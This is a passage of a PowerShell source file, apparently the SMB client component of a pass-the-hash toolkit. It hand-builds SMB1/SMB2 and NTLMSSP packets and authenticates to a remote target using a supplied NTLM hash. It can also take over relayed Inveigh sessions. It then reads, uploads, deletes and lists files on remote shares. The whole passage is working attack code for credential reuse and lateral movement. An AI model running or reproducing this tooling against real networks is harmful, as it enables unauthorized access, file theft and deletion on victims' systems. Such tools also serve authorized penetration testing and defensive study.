                                        $negotiate_flags = 0x05,0x82,0x08,0xa0
                                    }

                                }

                            }
                            else
                            {
                                $stage = 'NegotiateSMB2'

                                if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {   

                                        if(!$SMB_signing)
                                        {
                                            Write-Verbose "[+] SMB signing is required"
                                        }

                                        $SMB_signing = $true
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x15,0x82,0x08,0xa0
                                    }

                                }
                                else
                                {

                                    if($signing_check)
                                    {
                                        Write-Output "[+] SMB signing is not required on $Target"
                                        $stage = 'Exit'
                                    }
                                    else
                                    {    
                                        $SMB_signing = $false
                                        $session_key_length = 0x00,0x00
                                        $negotiate_flags = 0x05,0x80,0x08,0xa0
                                    }

                                }

                            }

                        }
                        catch
                        {

                            if($_.Exception.Message -like 'Exception calling "Read" with "3" argument(s): "Unable to read data from the transport connection: An existing connection was forcibly closed by the remote host."')
                            {
                                Write-Output "[-] SMB1 negotiation failed"
                                $negoitiation_failed = $true
                                $stage = 'Exit'
                            }

                        }

                    }

                    'NegotiateSMB2'
                    {

                        if($SMB_version -eq 'SMB2.1')
                        {
                            $message_ID = 0
                        }
                        else
                        {
                            $message_ID = 1
                        }

                        $tree_ID = 0x00,0x00,0x00,0x00
                        $session_ID = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
                        $packet_SMB_header = New-PacketSMB2Header 0x00,0x00 0x00,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2NegotiateProtocolRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'NTLMSSPNegotiate'

                        if([System.BitConverter]::ToString($client_receive[70]) -eq '03')
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {

                                if(!$SMB_signing)
                                {
                                    Write-Verbose "[+] SMB signing is required"
                                }

                                $SMB_signing = $true
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x15,0x82,0x08,0xa0
                            }

                        }
                        else
                        {

                            if($signing_check)
                            {
                                Write-Output "[+] SMB signing is not required on $target"
                                $stage = 'Exit'
                            }
                            else
                            {
                                $SMB_signing = $false
                                $session_key_length = 0x00,0x00
                                $negotiate_flags = 0x05,0x80,0x08,0xa0
                            }

                        }

                    }
                        
                    'NTLMSSPNegotiate'
                    { 
                        
                        if($SMB_version -eq 'SMB1')
                        {
                            $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID 0x00,0x00

                            if($SMB_signing)
                            {
                                $packet_SMB_header["Flags2"] = 0x05,0x48
                            }

                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }
                        else
                        {
                            $message_ID++
                            $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x1f,0x00 $false $message_ID $process_ID $tree_ID $session_ID
                            $packet_NTLMSSP_negotiate = New-PacketNTLMSSPNegotiate $negotiate_flags 0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                            $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate       
                            $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_negotiate
                            $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                            $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                            $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                            $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        }

                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()    
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $stage = 'Exit'
                    }
                    
                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $negoitiation_failed = $true
            }

        }

        if(!$signing_check -and !$negoitiation_failed)
        {
            $NTLMSSP = [System.BitConverter]::ToString($client_receive)
            $NTLMSSP = $NTLMSSP -replace "-",""
            $NTLMSSP_index = $NTLMSSP.IndexOf("4E544C4D53535000")
            $NTLMSSP_bytes_index = $NTLMSSP_index / 2
            $domain_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 12) $client_receive
            $target_length = Get-UInt16DataLength ($NTLMSSP_bytes_index + 40) $client_receive
            $session_ID = $client_receive[44..51]
            $NTLM_challenge = $client_receive[($NTLMSSP_bytes_index + 24)..($NTLMSSP_bytes_index + 31)]
            $target_details = $client_receive[($NTLMSSP_bytes_index + 56 + $domain_length)..($NTLMSSP_bytes_index + 55 + $domain_length + $target_length)]
            $target_time_bytes = $target_details[($target_details.Length - 12)..($target_details.Length - 5)]
            $NTLM_hash_bytes = (&{for ($i = 0;$i -lt $hash.Length;$i += 2){$hash.SubString($i,2)}}) -join "-"
            $NTLM_hash_bytes = $NTLM_hash_bytes.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
            $auth_hostname = (Get-ChildItem -path env:computername).Value
            $auth_hostname_bytes = [System.Text.Encoding]::Unicode.GetBytes($auth_hostname)
            $auth_domain_bytes = [System.Text.Encoding]::Unicode.GetBytes($Domain)
            $auth_username_bytes = [System.Text.Encoding]::Unicode.GetBytes($username)
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_domain_length = [System.BitConverter]::GetBytes($auth_domain_bytes.Length)[0,1]
            $auth_username_length = [System.BitConverter]::GetBytes($auth_username_bytes.Length)[0,1]
            $auth_hostname_length = [System.BitConverter]::GetBytes($auth_hostname_bytes.Length)[0,1]
            $auth_domain_offset = 0x40,0x00,0x00,0x00
            $auth_username_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + 64)
            $auth_hostname_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + 64)
            $auth_LM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 64)
            $auth_NTLM_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + 88)
            $HMAC_MD5 = New-Object System.Security.Cryptography.HMACMD5
            $HMAC_MD5.key = $NTLM_hash_bytes
            $username_and_target = $username.ToUpper()
            $username_and_target_bytes = [System.Text.Encoding]::Unicode.GetBytes($username_and_target)
            $username_and_target_bytes += $auth_domain_bytes
            $NTLMv2_hash = $HMAC_MD5.ComputeHash($username_and_target_bytes)
            $client_challenge = [String](1..8 | ForEach-Object {"{0:X2}" -f (Get-Random -Minimum 1 -Maximum 255)})
            $client_challenge_bytes = $client_challenge.Split(" ") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}

            $security_blob_bytes = 0x01,0x01,0x00,0x00,
                                    0x00,0x00,0x00,0x00 +
                                    $target_time_bytes +
                                    $client_challenge_bytes +
                                    0x00,0x00,0x00,0x00 +
                                    $target_details +
                                    0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00

            $server_challenge_and_security_blob_bytes = $NTLM_challenge + $security_blob_bytes
            $HMAC_MD5.key = $NTLMv2_hash
            $NTLMv2_response = $HMAC_MD5.ComputeHash($server_challenge_and_security_blob_bytes)

            if($SMB_signing)
            {
                $session_base_key = $HMAC_MD5.ComputeHash($NTLMv2_response)
                $session_key = $session_base_key
                $HMAC_SHA256 = New-Object System.Security.Cryptography.HMACSHA256
                $HMAC_SHA256.key = $session_key
            }

            $NTLMv2_response = $NTLMv2_response + $security_blob_bytes
            $NTLMv2_response_length = [System.BitConverter]::GetBytes($NTLMv2_response.Length)[0,1]
            $session_key_offset = [System.BitConverter]::GetBytes($auth_domain_bytes.Length + $auth_username_bytes.Length + $auth_hostname_bytes.Length + $NTLMv2_response.Length + 88)

            $NTLMSSP_response = 0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00,
                                    0x03,0x00,0x00,0x00,
                                    0x18,0x00,
                                    0x18,0x00 +
                                    $auth_LM_offset +
                                    $NTLMv2_response_length +
                                    $NTLMv2_response_length +
                                    $auth_NTLM_offset +
                                    $auth_domain_length +
                                    $auth_domain_length +
                                    $auth_domain_offset +
                                    $auth_username_length +
                                    $auth_username_length +
                                    $auth_username_offset +
                                    $auth_hostname_length +
                                    $auth_hostname_length +
                                    $auth_hostname_offset +
                                    $session_key_length +
                                    $session_key_length +
                                    $session_key_offset +
                                    $negotiate_flags +
                                    $auth_domain_bytes +
                                    $auth_username_bytes +
                                    $auth_hostname_bytes +
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                                    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 +
                                    $NTLMv2_response

            if($SMB_version -eq 'SMB1')
            {
                $SMB_user_ID = $client_receive[32,33]
                $packet_SMB_header = New-PacketSMBHeader 0x73 0x18 0x07,0xc8 0xff,0xff $process_ID $SMB_user_ID

                if($SMB_signing)
                {
                    $packet_SMB_header["Flags2"] = 0x05,0x48
                }

                $packet_SMB_header["UserID"] = $SMB_user_ID
                $packet_NTLMSSP_negotiate = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_negotiate = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_negotiate      
                $packet_SMB_data = New-PacketSMBSessionSetupAndXRequest $NTLMSSP_negotiate
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }
            else
            {
                $message_ID++
                $packet_SMB_header = New-PacketSMB2Header 0x01,0x00 0x00,0x00 $false $message_ID  $process_ID $tree_ID $session_ID
                $packet_NTLMSSP_auth = New-PacketNTLMSSPAuth $NTLMSSP_response
                $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                $NTLMSSP_auth = ConvertFrom-PacketOrderedDictionary $packet_NTLMSSP_auth        
                $packet_SMB_data = New-PacketSMB2SessionSetupRequest $NTLMSSP_auth
                $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service
                $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
            }

            try
            {
                $client_stream.Write($client_send,0,$client_send.Length) > $null
                $client_stream.Flush()
                $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                if($SMB_version -eq 'SMB1')
                {

                    if([System.BitConverter]::ToString($client_receive[9..12]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        Write-Output "[-] SMB1 is only supported with signing check and authentication"
                        $login_successful = $false
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }
                else
                {
                    if([System.BitConverter]::ToString($client_receive[12..15]) -eq '00-00-00-00')
                    {
                        Write-Verbose "[+] $output_username successfully authenticated on $Target"
                        $login_successful = $true
                    }
                    else
                    {
                        Write-Output "[!] $output_username failed to authenticate on $Target"
                        $login_successful = $false
                    }

                }

            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
                $login_successful = $false
            }

        }

    }

    try
    {

        if($login_successful -or $inveigh_session)
        {

            if($inveigh_session)
            {

                if($inveigh_session -and $inveigh.session_lock_table[$session] -eq 'locked')
                {
                    Write-Output "[*] Pausing due to Inveigh Relay session lock"
                    Start-Sleep -s 2
                }

                $inveigh.session_lock_table[$session] = 'locked'
                $client = $inveigh.session_socket_table[$session]
                $client_stream = $client.GetStream()
                $session_ID = $inveigh.session_table[$session]
                $message_ID =  $inveigh.session_message_ID_table[$session]
                $tree_ID = 0x00,0x00,0x00,0x00
                $SMB_signing = $false
            }

            $path = "\\" + $Target + "\IPC$"
            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
            $directory_list = New-Object System.Collections.ArrayList
            $stage = 'TreeConnect'

            while ($stage -ne 'Exit')
            {

                switch($stage)
                {
            
                    'CloseRequest'
                    {

                        if(!$file_ID)
                        {
                            $file_ID = $client_receive[132..147]
                        }

                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x06,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CloseRequest $file_ID
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        $file_ID = ''

                        if($directory_list.Count -gt 0 -and $Action -eq 'Recurse')
                        {
                            $file = $directory_list[0]
                            $root_directory = $file + 0x5c,0x00
                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'

                            if($root_directory.Count -gt 2)
                            {
                                $root_directory_extract = [System.BitConverter]::ToString($root_directory)
                                $root_directory_extract = $root_directory_extract -replace "-00",""

                                if($root_directory.Length -gt 2)
                                {
                                    $root_directory_extract = $root_directory_extract.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
                                    $root_directory_string = New-Object System.String ($root_directory_extract,0,$root_directory_extract.Length)
                                }
                                else
                                {
                                    $root_directory_string = [Char][System.Convert]::ToInt16($file,16)
                                }

                            }

                        }
                        elseif($Action -eq 'Get' -and $action_step -eq 1)
                        {

                            if($share_subdirectory -eq $source_file)
                            {
                                $file = ""
                            }
                            else
                            {
                                $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                            }

                            $create_request_extra_info = 1
                            $stage = 'CreateRequest'
                        }
                        elseif($Action -eq 'Delete')
                        {
                            
                            switch($action_step)
                            {

                                0
                                {

                                    if($share_subdirectory -eq $source_file)
                                    {
                                        $file = ""
                                    }
                                    else
                                    {
                                        $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory.Replace('\' + $source_file,''))
                                    }

                                    $create_request_extra_info = 1
                                    $stage = 'CreateRequest'
                                    $action_step++

                                }

                                1
                                {
                                    $stage = 'CreateRequestFindRequest'
                                }

                                3
                                {
                                    $stage = 'TreeDisconnect'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $share_subdirectory_start = $false
                            $stage = 'CreateRequestFindRequest'
                        }
                        else
                        {
                            $stage = 'TreeDisconnect'
                        }

                    }

                    'CreateRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file $create_request_extra_info $source_file_size

                        if($directory_list.Count -gt 0)
                        {
                            $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                            $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                        }
                        
                        if($Action -eq 'Delete')
                        {

                            switch($action_step)
                            {
                                
                                0
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x00,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                                2
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x40,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x80,0x00,0x01,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                                }

                            }

                        }

                        if($Action -eq 'Get')
                        {
                            $packet_SMB2_data["CreateOptions"] = 0x00,0x00,0x20,0x00
                            $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                            $packet_SMB2_data["ShareAccess"] = 0x05,0x00,0x00,0x00
                        }

                        if($Action -eq 'Put')
                        {
                        
                            switch($action_step)
                            {

                                0
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x60,0x00,0x20,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x89,0x00,0x12,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x01,0x00,0x00,0x00
                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                }

                                1
                                {
                                    $packet_SMB2_data["CreateOptions"] = 0x64,0x00,0x00,0x00
                                    $packet_SMB2_data["DesiredAccess"] = 0x97,0x01,0x13,0x00
                                    $packet_SMB2_data["ShareAccess"] = 0x00,0x00,0x00,0x00
                                    $packet_SMB2_data["RequestedOplockLevel"] = 0xff
                                    $packet_SMB2_data["FileAttributes"] = 0x20,0x00,0x00,0x00
                                    $packet_SMB2_data["CreateDisposition"] = 0x05,0x00,0x00,0x00
                                }

                            }

                        }

                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data  
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB2_header.Length $SMB2_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null
                        
                        if([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                        {

                            $error_code = [System.BitConverter]::ToString($client_receive[15..12])

                            switch($error_code)
                            {

                                'c0-00-01-03'
                                {
                                    $stage = 'Exit'
                                }

                                'c0-00-00-22'
                                {

                                    if($directory_list.Count -gt 0)
                                    {
                                        $directory_list.RemoveAt(0) > $null
                                    }
                                    else
                                    {
                                        $output_message = "[-] Access denied"
                                        $share_subdirectory_start = $false
                                    }

                                    $stage = 'CloseRequest'

                                }

                                'c0-00-00-34'
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $create_request_extra_info = 3
                                        $action_step++
                                        $stage = 'CreateRequest'
                                    }
                                    else
                                    {
                                        $output_message = "[-] File not found"
                                        $stage = 'Exit'
                                    }

                                }

                                'c0-00-00-ba'
                                {
                                    
                                    if($Action -eq 'Put')
                                    {
                                        $output_message = "[-] Destination filname must be specified"
                                        $stage = 'CloseRequest'
                                    }

                                }

                                default
                                {
                                    $error_code = $error_code -replace "-",""
                                    $output_message = "[-] Create request error code 0x$error_code"
                                    $stage = 'Exit'
                                }

                            }

                        }
                        elseif($Action -eq 'Delete' -and $action_step -eq 2)
                        {
                            $set_info_request_file_info_class = 0x01
                            $set_info_request_info_level = 0x0d
                            $set_info_request_buffer = 0x01,0x00,0x00,0x00
                            $file_ID = $client_receive[132..147]
                            $stage = 'SetInfoRequest'
                        }
                        elseif($Action -eq 'Get' -and $action_step -ne 1)
                        {

                            switch($action_step)
                            {

                                0
                                {
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'CloseRequest'
                                }

                                2
                                {

                                    if($file_size -lt 4096)
                                    {
                                        $read_request_length = $file_size
                                    }
                                    else
                                    {
                                        $read_request_length = 4096
                                    }

                                    $read_request_offset = 0
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'ReadRequest'
                                }

                                4
                                {
                                    $header_next_command = 0x68,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x01
                                    $query_info_request_file_info_class_1 = 0x07
                                    $query_info_request_output_buffer_length_1 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x68,0x00
                                    $query_info_request_buffer_1 = 0
                                    $query_info_request_info_type_2 = 0x01
                                    $query_info_request_file_info_class_2 = 0x16
                                    $query_info_request_output_buffer_length_2 = 0x00,0x10,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x68,0x00
                                    $query_info_request_buffer_2 = 0
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($Action -eq 'Put')
                        {

                            switch($action_step)
                            {

                                0
                                {

                                    if($Action -eq 'Put')
                                    {
                                        $output_message = "Destination file exists"
                                        $stage = 'CloseRequest'
                                    }

                                }

                                1
                                {
                                    $file_ID = $client_receive[132..147]
                                    $action_step++
                                    $header_next_command = 0x70,0x00,0x00,0x00
                                    $query_info_request_info_type_1 = 0x02
                                    $query_info_request_file_info_class_1 = 0x01
                                    $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_1 = 0x00,0x00
                                    $query_info_request_buffer_1 = 8
                                    $query_info_request_info_type_2 = 0x02
                                    $query_info_request_file_info_class_2 = 0x05
                                    $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                                    $query_info_request_input_buffer_offset_2 = 0x00,0x00
                                    $query_info_request_buffer_2 = 1
                                    $stage = 'QueryInfoRequest'
                                }

                            }

                        }
                        elseif($share_subdirectory_start)
                        {
                            $file_ID = $client_receive[132..147]
                            $stage = 'CloseRequest'
                        }
                        elseif($directory_list.Count -gt 0 -or $action_step -eq 1)
                        {
                            $stage = 'FindRequest'
                        }
                        else
                        {
                            $header_next_command = 0x70,0x00,0x00,0x00
                            $query_info_request_info_type_1 = 0x02
                            $query_info_request_file_info_class_1 = 0x01
                            $query_info_request_output_buffer_length_1 = 0x58,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_1 = 0x00,0x00
                            $query_info_request_buffer_1 = 8
                            $query_info_request_info_type_2 = 0x02
                            $query_info_request_file_info_class_2 = 0x05
                            $query_info_request_output_buffer_length_2 = 0x50,0x00,0x00,0x00
                            $query_info_request_input_buffer_offset_2 = 0x00,0x00
                            $query_info_request_buffer_2 = 1
                            $file_ID = $client_receive[132..147]
                            $stage = 'QueryInfoRequest'

                            if($share_subdirectory)
                            {
                                $share_subdirectory_start = $true
                            }

                        }

                    }

                    'CreateRequestFindRequest'
                    {
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x05,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_data = New-PacketSMB2CreateRequest $file 1
                        $packet_SMB2_data["DesiredAccess"] = 0x81,0x00,0x10,0x00
                        $packet_SMB2_data["ShareAccess"] = 0x07,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data
                        $packet_SMB2_header["NextCommand"] = [System.BitConverter]::GetBytes($SMB2_header.Length + $SMB2_data.Length)
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data  
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2_header["Signature"] = $SMB2_signature
                            $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        }

                        $message_ID++
                        $packet_SMB2b_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2b_header["NextCommand"] = 0x68,0x00,0x00,0x00

                        if($SMB_signing)
                        {
                            $packet_SMB2b_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2b_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2b_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        $SMB2b_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2b_header + $SMB2b_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2b_header["Signature"] = $SMB2_signature
                            $SMB2b_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2b_header
                        }

                        $message_ID++
                        $packet_SMB2c_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID

                        if($SMB_signing)
                        {
                            $packet_SMB2c_header["Flags"] = 0x0c,0x00,0x00,0x00      
                        }
                        else
                        {
                            $packet_SMB2c_header["Flags"] = 0x04,0x00,0x00,0x00
                        }

                        $packet_SMB2c_data = New-PacketSMB2FindRequestFile 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
                        $packet_SMB2c_data["OutputBufferLength"] = 0x80,0x00,0x00,0x00
                        $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        $SMB2c_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService ($SMB2_header.Length + $SMB2b_header.Length + $SMB2c_header.Length)  ($SMB2_data.Length + $SMB2b_data.Length + $SMB2c_data.Length)
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2c_header + $SMB2c_data 
                            $SMB2_signature = $HMAC_SHA256.ComputeHash($SMB2_sign)
                            $SMB2_signature = $SMB2_signature[0..15]
                            $packet_SMB2c_header["Signature"] = $SMB2_signature
                            $SMB2c_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2c_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB2_header + $SMB2_data + $SMB2b_header + $SMB2b_data + $SMB2c_header + $SMB2c_data
                        $client_stream.Write($client_send,0,$client_send.Length) > $null
                        $client_stream.Flush()
                        $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                        if($Action -eq 'Delete')
                        {
                            $stage = 'CreateRequest'
                            $file = [System.Text.Encoding]::Unicode.GetBytes($share_subdirectory)
                            $action_step++
                        }
                        else
                        {
                            $stage = 'ParseDirectoryContents'
                        }

                    }

                    'FindRequest'
                    {
                        $file_ID = $client_receive[132..147]
                        $message_ID++
                        $packet_SMB2_header = New-PacketSMB2Header 0x0e,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB2_header["NextCommand"] = 0x68,0x00,0x00,0x00
                        $packet_SMB2_data = New-PacketSMB2FindRequestFile $file_ID 0x00,0x00,0x00,0x00,0x00,0x00
                        $SMB2_header = ConvertFrom-PacketOrderedDictionary $packet_SMB2_header
                        $SMB2_data = ConvertFrom-PacketOrderedDictionary $packet_SMB2_data    

                        if($SMB_signing)
                        {
                            $SMB2_sign = $SMB2_header + $SMB2_data 
